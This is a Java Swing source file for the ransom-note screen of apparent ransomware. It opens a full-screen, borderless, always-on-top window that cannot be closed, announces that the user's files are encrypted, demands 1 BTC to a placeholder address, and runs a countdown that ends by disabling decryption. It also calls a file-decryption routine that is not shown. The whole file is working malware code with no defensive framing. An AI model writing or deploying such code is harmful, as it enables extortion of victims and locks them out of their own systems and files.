import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class RansomGUI {
    private final String encryptionKey;
    private final File folder;
    private final long endTimeMillis;

    public RansomGUI(File folder, String encryptionKey, long countdownDurationMs) {
        this.folder = folder;
        this.encryptionKey = encryptionKey;
        this.endTimeMillis = System.currentTimeMillis() + countdownDurationMs;
    }

    public void show() {
        JFrame frame = new JFrame();
        frame.setUndecorated(true);
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
        frame.setAlwaysOnTop(true);
        frame.getContentPane().setBackground(Color.BLACK);
        frame.setLayout(new GridBagLayout());

        GridBagConstraints gbc = new GridBagConstraints();
        gbc.fill = GridBagConstraints.HORIZONTAL;
        gbc.anchor = GridBagConstraints.CENTER;
        gbc.insets = new Insets(10, 40, 10, 40);

        // Title
        JLabel title = new JLabel("YOUR FILES HAVE BEEN ENCRYPTED", SwingConstants.CENTER);
        title.setForeground(Color.RED);
        title.setFont(new Font("Arial", Font.BOLD, 48));
        gbc.gridx = 0;
        gbc.gridy = 0;
        frame.add(title, gbc);

        // Countdown Label (dynamic)
        JLabel countdownLabel = new JLabel("", SwingConstants.CENTER);
        countdownLabel.setForeground(Color.YELLOW);
        countdownLabel.setFont(new Font("Consolas", Font.BOLD, 20));
        gbc.gridy++;
        frame.add(countdownLabel, gbc);

        // Message
        JTextArea message = new JTextArea(
                "All your important files have been encrypted.\n\n" +
                "To get them back, send 1 BTC to the address below:\n\n" +
                "FAKE-BTC-ADDRESS-1234567890\n\n" +
                "Then enter the decryption key you received below:");
        message.setForeground(Color.WHITE);
        message.setBackground(Color.BLACK);
        message.setFont(new Font("Consolas", Font.PLAIN, 18));
        message.setEditable(false);
        message.setFocusable(false);
        message.setOpaque(false);
        message.setWrapStyleWord(true);
        message.setLineWrap(true);
        gbc.gridy++;
        gbc.ipady = 100;
        frame.add(message, gbc);
        gbc.ipady = 0;

        // Key field
        JTextField keyField = new JTextField();
        keyField.setFont(new Font("Consolas", Font.BOLD, 22));
        keyField.setHorizontalAlignment(JTextField.CENTER);
        keyField.setMaximumSize(new Dimension(400, 45));
        keyField.setPreferredSize(new Dimension(400, 45));
        keyField.setBackground(Color.BLACK);
        keyField.setForeground(Color.RED);
        keyField.setCaretColor(Color.RED);
        keyField.setBorder(BorderFactory.createLineBorder(Color.RED, 2));
        gbc.gridy++;
        frame.add(keyField, gbc);

        // Decrypt button
        JButton decryptButton = new JButton("DECRYPT FILES");
        decryptButton.setFont(new Font("Arial", Font.BOLD, 24));
        decryptButton.setBackground(Color.RED);
        decryptButton.setForeground(Color.WHITE);
        decryptButton.setFocusPainted(false);
        decryptButton.setPreferredSize(new Dimension(220, 50));
        gbc.gridy++;
        frame.add(decryptButton, gbc);

        decryptButton.addActionListener((ActionEvent e) -> {
            String userKey = keyField.getText().trim();
            if (userKey.equals(encryptionKey)) {
                try {
                    FileEncryptor.decryptFolderWithPassword(folder, encryptionKey);
                    JOptionPane.showMessageDialog(frame, "Decryption successful. Your files are restored.");
                    frame.dispose();
                } catch (Exception ex) {
                    JOptionPane.showMessageDialog(frame, "Error during decryption: " + ex.getMessage());
                }
            } else {
                JOptionPane.showMessageDialog(frame, "Incorrect key! Your files remain locked.");
            }
        });

        // Countdown Timer (1-second updates)
        Timer timer = new Timer(1000, (ActionEvent e) -> {
            long remaining = endTimeMillis - System.currentTimeMillis();
            if (remaining > 0) {
                long hours = TimeUnit.MILLISECONDS.toHours(remaining);
                long minutes = TimeUnit.MILLISECONDS.toMinutes(remaining) % 60;
                long seconds = TimeUnit.MILLISECONDS.toSeconds(remaining) % 60;
                countdownLabel.setText(String.format("Time remaining: %02d:%02d:%02d", hours, minutes, seconds));
            } else {
                countdownLabel.setText("Time's up! Your files are gone forever.");
                keyField.setEnabled(false);
                decryptButton.setEnabled(false);
                ((Timer) e.getSource()).stop();
            }
        });
        timer.setInitialDelay(0);
        timer.start();

        frame.setVisible(true);
    }
}
